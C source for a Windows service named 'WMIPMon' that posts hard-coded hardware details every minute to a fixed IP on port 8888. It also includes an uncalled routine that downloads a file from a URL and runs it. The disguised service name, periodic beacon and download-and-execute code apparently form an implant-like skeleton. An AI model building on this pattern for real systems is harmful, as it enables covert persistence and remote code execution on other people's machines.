#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <string.h>
#include "cJSON.h"  // Make sure cJSON.h is included (from the cJSON library)

#define SERVICE_NAME "WMIPMon"
#define TARGET_URL "http://10.113.210.251"
#define TARGET_HTTP_PORT 8888
#define INTERVAL_MS (1 * 60 * 1000)  // 1 minute

SERVICE_STATUS        g_ServiceStatus = { 0 };
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE                g_ServiceStopEvent = NULL;

// Function declarations
void WINAPI ServiceMain(DWORD argc, LPTSTR* argv);
void WINAPI ServiceCtrlHandler(DWORD CtrlCode);
DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);
void MakeHttpPostRequestAndParseJSON(void);

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")

int DownloadFile(const char* url, const char* outputFile) {
    HINTERNET hInternet = InternetOpen("MyDownloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("InternetOpen failed\n");
        return 1;
    }

    HINTERNET hFile = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        printf("InternetOpenUrl failed\n");
        InternetCloseHandle(hInternet);
        return 1;
    }

    FILE* file = fopen(outputFile, "wb");
    if (!file) {
        printf("Failed to open file for writing\n");
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return 1;
    }

    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        fwrite(buffer, 1, bytesRead, file);
    }

    printf("Download complete.\n");

    fclose(file);
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    ShellExecute(NULL, "open", outputFile, NULL, NULL, SW_SHOWNORMAL);

    return 0;
}



void MakeHttpPostRequestAndParseJSON(void) {
    char responseBuffer[4096];
    DWORD bytesRead;

    // Step 1: Create JSON body
    cJSON* json = cJSON_CreateObject();
    cJSON_AddStringToObject(json, "memory", "2GB");
    cJSON_AddStringToObject(json, "cpu", "Intel i5");
    cJSON_AddStringToObject(json, "disk", "256GB SSD");

    char* postData = cJSON_PrintUnformatted(json);
    DWORD postDataLen = (DWORD)strlen(postData);
    const char* headers = "Content-Type: application/json\r\n";

    // Step 2: Open internet connection
    HINTERNET hInternet = InternetOpen("WebPostService", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        printf("InternetOpen failed: %lu\n", GetLastError());
        cJSON_Delete(json);
        free(postData);
        return;
    }

    // Step 3: Connect to host (hostname/IP only)
    HINTERNET hConnect = InternetConnect(hInternet, "10.113.210.251", TARGET_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        printf("InternetConnect failed: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        cJSON_Delete(json);
        free(postData);
        return;
    }

    // Step 4: Open HTTP POST request
    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        printf("HttpOpenRequest failed: %lu\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        cJSON_Delete(json);
        free(postData);
        return;
    }

    // Step 5: Send POST request
    BOOL result = HttpSendRequest(hRequest, headers, -1L, (LPVOID)postData, postDataLen);
    if (!result) {
        printf("HttpSendRequest failed: %lu\n", GetLastError());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        cJSON_Delete(json);
        free(postData);
        return;
    }

    // Step 6: Read response
    if (InternetReadFile(hRequest, responseBuffer, sizeof(responseBuffer) - 1, &bytesRead) && bytesRead > 0) {
        responseBuffer[bytesRead] = '\0';
        printf("Response: %s\n", responseBuffer);

        // Step 7: Parse JSON response
        cJSON* responseJson = cJSON_Parse(responseBuffer);
        if (responseJson) {
            cJSON* status = cJSON_GetObjectItemCaseSensitive(responseJson, "status");
            if (cJSON_IsString(status)) {
                printf("Status: %s\n", status->valuestring);
            }
            else {
                printf("Status not found or not a string\n");
            }
            cJSON_Delete(responseJson);
        }
        else {
            printf("Error parsing JSON response\n");
        }
    }
    else {
        printf("Error reading response or no data received: %lu\n", GetLastError());
    }

    // Step 8: Clean up
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    cJSON_Delete(json);
    free(postData);
}



DWORD WINAPI ServiceWorkerThread(LPVOID lpParam) {
    while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0) {
        MakeHttpPostRequestAndParseJSON();
        Sleep(INTERVAL_MS);
    }
    return 0;
}

void WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
    switch (CtrlCode) {
    case SERVICE_CONTROL_STOP:
        if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
            break;

        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        g_ServiceStatus.dwWin32ExitCode = 0;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

        SetEvent(g_ServiceStopEvent);
        break;
    default:
        break;
    }
}

void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);

    if (!g_StatusHandle)
        return;

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    if (g_ServiceStopEvent == NULL) {
        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = GetLastError();
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        return;
    }

    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(g_ServiceStopEvent);

    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 3;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

int main(void) {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };

    if (!StartServiceCtrlDispatcher(ServiceTable)) {
        printf("StartServiceCtrlDispatcher failed (%lu)\n", GetLastError());
    }

    return 0;
}
